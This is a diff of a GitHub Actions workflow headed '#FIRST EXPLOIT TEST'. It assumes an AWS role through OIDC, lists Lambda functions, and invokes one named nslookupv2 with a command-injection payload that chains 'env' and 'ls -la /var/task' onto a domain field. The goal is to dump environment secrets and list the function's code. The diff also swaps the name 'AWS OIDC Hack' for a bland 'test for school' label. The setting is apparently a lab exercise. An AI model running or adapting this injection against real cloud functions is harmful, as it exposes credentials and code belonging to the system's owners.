@@ -1,41 +1,41 @@
 #FIRST EXPLOIT TEST
 
-name: AWS OIDC Hack
+name: AWS OIDC test for school standart old code procedure
+
 on:
   push:
     branches:
       - corgi
 
-
-
-
-
 permissions:
   id-token: write
   contents: read
-
-
-
-
-
 
 jobs:
   exploit:
     runs-on: ubuntu-latest
     steps:
       - name: Configure AWS Credentials
-      
         uses: aws-actions/configure-aws-credentials@v4
-        
         with:
           role-to-assume: arn:aws:iam::009661764077:role/cicdRole
-
-          
           aws-region: us-east-1
 
-
-
-      - name: Test Access
+      - name: Test Access and Exploit Command Injection
         run: |
+          echo "=== 1. Verify Identity ==="
           aws sts get-caller-identity
+
+          echo "=== 2. List Functions ==="
           aws lambda list-functions
+
+          echo "=== 3. Invoke Lambda & Inject Command ==="
+          aws lambda invoke \
+            --function-name nslookupv2 \
+            --region us-east-1 \
+            --cli-binary-format raw-in-base64-out \
+            --payload '{"domain": "127.0.0.1; env; ls -la /var/task"}' \
+            response.json
+
+          echo "=== 4. Print Response Output ==="
+          cat response.json
